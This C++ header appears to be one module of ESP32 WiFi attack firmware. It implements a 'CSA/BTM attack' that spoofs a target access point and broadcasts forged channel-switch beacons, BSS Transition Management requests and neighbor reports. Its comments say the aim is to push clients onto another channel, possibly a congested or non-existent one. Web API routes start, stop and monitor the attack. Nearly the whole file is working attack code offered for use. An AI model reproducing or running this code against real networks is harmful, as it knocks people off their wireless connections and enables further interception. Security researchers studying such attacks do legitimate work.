#pragma once
#include <WiFi.h>
#include <esp_wifi.h>
#include "frames.h"
#include "module.h"
#include "safety.h"

// CSA/BTM attack: inject Channel Switch Announcement beacons + BSS Transition Management
// Sends ECSA beacons + BTM action frames targeting the victim BSSID/SSID/channel
// Causes clients to switch to target_ch (or a congested/non-existent channel)
static bool csa_running = false;
static uint8_t csa_bssid[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
static uint8_t csa_ch = 6;
static uint8_t csa_target_ch = 14;
static String csa_ssid = "target";
static volatile uint32_t csa_sent = 0;
static TaskHandle_t csa_task = nullptr;

static void csa_run(void *) {
  uint8_t f[256];
  csa_sent = 0;
  while (csa_running) {
    if (!safety_rate_ok(2)) {
      vTaskDelay(pdMS_TO_TICKS(50));
      continue;
    }
    // ECSA beacon spoofing target AP
    size_t n = f_ecsa(f, csa_bssid, csa_ssid.c_str(), csa_ch, csa_target_ch);
    esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
    csa_sent++;
    // BTM request to broadcast (roam to target_ch)
    n = f_actionBTM(f, BC, csa_bssid, csa_target_ch);
    esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
    csa_sent++;
    // Neighbor report action with target channel
    n = f_actionNeighbor(f, BC, csa_bssid, csa_target_ch);
    esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
    csa_sent++;
    vTaskDelay(pdMS_TO_TICKS(100));
  }
  csa_task = nullptr;
  vTaskDelete(nullptr);
}

static bool csa_start(const String &q) {
  int i;
  String bs, ss, ch, tc;
  if ((i = q.indexOf("bssid=")) >= 0) {
    int e = q.indexOf('&', i);
    bs = q.substring(i + 6, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("ssid=")) >= 0) {
    int e = q.indexOf('&', i);
    ss = q.substring(i + 5, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("ch=")) >= 0) {
    int e = q.indexOf('&', i);
    ch = q.substring(i + 3, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("target_ch=")) >= 0) {
    int e = q.indexOf('&', i);
    tc = q.substring(i + 10, e < 0 ? q.length() : e);
  }
  if (bs.length() == 17) {
    unsigned _b[6] = {0};
    sscanf(bs.c_str(), "%x:%x:%x:%x:%x:%x", &_b[0], &_b[1], &_b[2], &_b[3], &_b[4], &_b[5]);
    for (int _i = 0; _i < 6; _i++)
      csa_bssid[_i] = (uint8_t)_b[_i];
  }
  if (ss.length())
    csa_ssid = ss;
  csa_ch = ch.toInt();
  if (!csa_ch)
    csa_ch = 6;
  csa_target_ch = tc.toInt();
  if (!csa_target_ch)
    csa_target_ch = 14;
  esp_wifi_set_channel(csa_ch, WIFI_SECOND_CHAN_NONE);
  csa_running = true;
  csa_sent = 0;
  xTaskCreate(csa_run, "csa_run", 4096, nullptr, 5, &csa_task);
  return true;
}
static void csa_stop() {
  csa_running = false;
}
static void csa_routes() {
  extern WebServer server;
  server.on("/api/csa/start", HTTP_POST, []() {
    String q;
    for (int i = 0; i < server.args(); i++) {
      if (i)
        q += '&';
      q += server.argName(i) + '=' + server.arg(i);
    }
    bool ok = tool_start("csa", q);
    server.send(200, "application/json", ok ? "{\"ok\":1}" : "{\"ok\":0,\"err\":\"busy\"}");
  });
  server.on("/api/csa/stop", HTTP_POST, []() {
    tool_stop("csa");
    server.send(200, "application/json", "{\"ok\":1}");
  });
  server.on("/api/csa/status", HTTP_GET, []() {
    server.send(200, "application/json",
                "{\"running\":" + String(csa_running ? 1 : 0) + ",\"sent\":" + String(csa_sent) +
                    ",\"msg\":\"sent " + String(csa_sent) + "\"}");
  });
}
